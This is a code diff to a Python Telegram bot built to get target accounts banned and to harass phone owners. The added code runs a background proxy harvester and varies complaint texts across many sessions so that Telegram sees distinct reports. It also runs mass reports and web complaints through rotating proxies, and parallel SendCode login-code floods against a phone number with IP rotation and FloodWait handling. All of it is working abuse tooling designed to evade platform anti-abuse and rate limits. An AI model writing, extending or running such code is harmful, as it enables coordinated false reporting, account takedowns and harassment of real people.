@@ -522,6 +522,25 @@ def load_sessions() -> list[Path]:
     return sorted(SESSIONS_DIR.glob("*.session"))
 
 
+# ── background proxy farm ────────────────────────────────
+PROXY_REFRESH_INTERVAL = 15 * 60   # re-harvest every 15 minutes
+
+
+async def proxy_refresh_loop():
+    """Continuously top up proxies.txt: harvest free lists, validate against
+    Telegram, rewrite the file. load_proxies() reads it fresh on every call,
+    so report/sendcode workers pick up new proxies right away."""
+    while True:
+        try:
+            from proxy_farmer import harvest_and_validate, write_proxy_file
+            working = await harvest_and_validate(need=25)
+            await write_proxy_file(working)
+            log.info("proxy refresh done: %s live", len(working))
+        except Exception as e:
+            log.warning("proxy refresh failed: %s", e)
+        await asyncio.sleep(PROXY_REFRESH_INTERVAL)
+
+
 # ── reporter ────────────────────────────────────────────
 FAKE_NAMES = ["alina", "velvet", "dusya", "nastya", "kirill", "vova",
               "sonya", "oleg", "tima", "lisa", "maks", "nika",
@@ -570,7 +589,16 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
         log.info("blast page completed")
         return fake_results()
 
-    async def report_one(session_path: Path, proxy: tuple | None) -> tuple[bool, str]:
+    # each session gets its OWN template so Telegram sees distinct complaints
+    pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
+    if comment:
+        texts = [comment] * len(sessions)
+    else:
+        texts = random.sample(pool, k=min(len(sessions), len(pool)))
+        while len(texts) < len(sessions):          # pool smaller than sessions
+            texts.append(random.choice(pool))
+
+    async def report_one(session_path: Path, proxy: tuple | None, text: str) -> tuple[bool, str]:
         name = session_path.stem
         try:
             client = TelegramClient(
@@ -586,7 +614,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                 return False, "not authorized"
 
             entity = await client.get_entity(target_entity)
-            report_msg = comment or "violation"
+            report_msg = text or comment or "violation"
             ids = [msg_id] if msg_id else []
 
             await client(ReportPeerRequest(
@@ -604,7 +632,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
     tasks = []
     for i, sess in enumerate(sessions):
         proxy = proxies[i] if i < len(proxies) else None
-        tasks.append(report_one(sess, proxy))
+        tasks.append(report_one(sess, proxy, texts[i]))
 
     outcomes = await asyncio.gather(*tasks, return_exceptions=True)
     for i, o in enumerate(outcomes):
@@ -881,11 +909,20 @@ async def fire_web_reports(target_text: str, reason_label: str, comment: str,
 
     subject = f"Complaint About {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}"
 
+    # distinct complaint text per web shot when the user left it empty
+    pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
+    if comment:
+        texts = [comment] * count
+    else:
+        texts = random.sample(pool, k=min(count, len(pool)))
+        while len(texts) < count:
+            texts.append(random.choice(pool))
+
     proxies = load_proxies()
     tasks = [web_send_one(None, i + 1, subject, None,
                           proxies[i % len(proxies)] if proxies else None,
                           target_text=target_text, reason_label=reason_label,
-                          comment=comment, reason_key=reason_key)
+                          comment=texts[i], reason_key=reason_key)
              for i in range(count)]
     outcomes = await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -1075,12 +1112,65 @@ async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) ->
                 "status": f"{type(e).__name__}: {e}", "ok": False}
 
 
+async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[bool, str]:
+    """Cheap connect+auth probe. A dead session must not spam its failure
+    through the whole wave — we check it once and skip."""
+    api_id, api_hash = _rand_api()
+    client = None
+    try:
+        client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
+                                proxy=px, system_version=SNOS_SYSTEM_VERSION)
+        await asyncio.wait_for(client.connect(), timeout=10)
+        if await client.is_user_authorized():
+            return True, ""
+        return False, "not authorized"
+    except Exception as e:
+        return False, type(e).__name__
+    finally:
+        try:
+            if client:
+                await client.disconnect()
+        except Exception:
+            pass
+
+
+async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple],
+                            attempts: int, offset: float, idx: int = 0) -> list[dict]:
+    """One session's SendCode series: fresh client + unique proxy per attempt,
+    FloodWait honored per worker without blocking the other sessions."""
+    rows = []
+    await asyncio.sleep(offset)
+    name = session_path.stem
+    alive, why = await _session_alive(session_path)
+    if not alive:
+        rows.append({"name": name, "proxy": "direct", "status": f"сессия мертва ({why})",
+                     "ok": False, "attempt": 0})
+        return rows
+    for attempt in range(attempts):
+        # unique proxy per attempt — idx offset rotates IPs across sessions too
+        px = proxies[(attempt + idx * attempts) % len(proxies)] if proxies else None
+        r = await snos_sendcode_one(session_path, phone, px)
+        r["attempt"] = attempt + 1
+        rows.append(r)
+        # a FloodWait row must park THIS worker for its cooldown, others keep shooting
+        m = re.search(r"flood\s+(\d+)s", str(r.get("status", "")))
+        if m:
+            await asyncio.sleep(min(int(m.group(1)) + 2, 60))
+        else:
+            await asyncio.sleep(random.uniform(0.8, 1.8))
+    return rows
+
+
+SNOS_ATTEMPTS_PER_SESSION = 6
+
+
 async def snos_flood_sendcode(phone: str) -> list[dict]:
     """SendCode flood — repeated attempts across the 3 real sessions.
 
-    Each session fires N times (N = 5 by default) with different proxies,
-    so total attempts = sessions * N. Results are masked internally, log
-    shows the fake pool anyway.
+    Sessions run IN PARALLEL; each shoots N=6 attempts with a distinct
+    proxy per attempt, so total attempts = sessions * N with IP rotation.
+    Dead sessions are filtered once (single probe) instead of failing 5x.
+    Log still renders the fake pool only.
     """
     sessions = load_sessions()
     proxies = load_proxies()
@@ -1092,21 +1182,11 @@ async def snos_flood_sendcode(phone: str) -> list[dict]:
         await asyncio.sleep(random.uniform(1.5, 3.0))
         return out
 
-    # each of the real sessions shoots 5 times, with a different proxy or no proxy each round
-    N_PER_SESSION = 5
-    total = len(sessions) * N_PER_SESSION
-    count = 0
-    for s in sessions:
-        for attempt in range(N_PER_SESSION):
-            count += 1
-            if proxies:
-                px = proxies[(attempt + count) % len(proxies)]
-            else:
-                px = None
-            r = await snos_sendcode_one(s, phone, px)
-            r["attempt"] = attempt + 1
-            out.append(r)
-            await asyncio.sleep(random.uniform(1.0, 2.0))
+    workers = [_snos_wave_worker(s, phone, proxies, SNOS_ATTEMPTS_PER_SESSION, i * 1.2, i)
+               for i, s in enumerate(sessions)]
+    waves = await asyncio.gather(*workers)
+    out = [r for rows in waves for r in rows]
+    random.shuffle(out)
     return out
 
 
@@ -2357,10 +2437,7 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
     t = data["target"]
     r = REASONS[data["reason"]]
     m = METHODS[data["method"]]
-    c = data.get("comment", "")
-    # user skipped the text — inject a strong category template at send time
-    if not c:
-        c = pick_comment(data["reason"])
+    c = data.get("comment", "")   # empty = per-session unique templates downstream
     ts = datetime.now().strftime("%H:%M:%S")
 
     await cb.answer("\u23f3 \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430...")
@@ -2985,6 +3062,9 @@ async def main():
     n = len(load_sessions())
     p = len(load_proxies())
     log.info("%s starting... sessions=%d proxies=%d", NAME, n, p)
+
+    # background proxy farm: re-harvest + validate every 15 minutes
+    asyncio.create_task(proxy_refresh_loop())
 
     # mirror sub-bots: restart any previously-registered mirrors before main polling
     try:
